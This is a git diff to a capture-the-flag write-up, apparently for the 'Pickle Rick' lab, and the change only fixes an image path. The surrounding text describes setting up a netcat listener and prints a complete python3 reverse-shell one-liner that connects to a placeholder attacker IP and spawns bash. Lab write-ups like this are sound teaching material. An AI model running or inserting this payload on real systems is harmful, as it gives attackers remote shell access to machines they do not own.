@@ -88,7 +88,7 @@ Turning to [the reverse shell cheatsheet](https://github.com/swisskyrepo/Payload
 
 All hope is lost. No, there is another... language we can use to possible gain a foothold. Ubuntu comes with another language called python, in which there is two versions python2 and python3. Now `which python` does it have? This gives us nothing. How about `which python3`? There it be, python3. Taking a look back to the cheatsheet shows that python can be utilized to gain a reverse shell. First, we set up our netcat listener
 
-![netcat](../../../static/writeupimgs/picklerickimgs/picklerickimgs/netcat.png)
+![netcat](../../../static/writeupimgs/picklerickimgs/netcat.png)
 
 Then execute payload `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacking ip>",port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'`
 
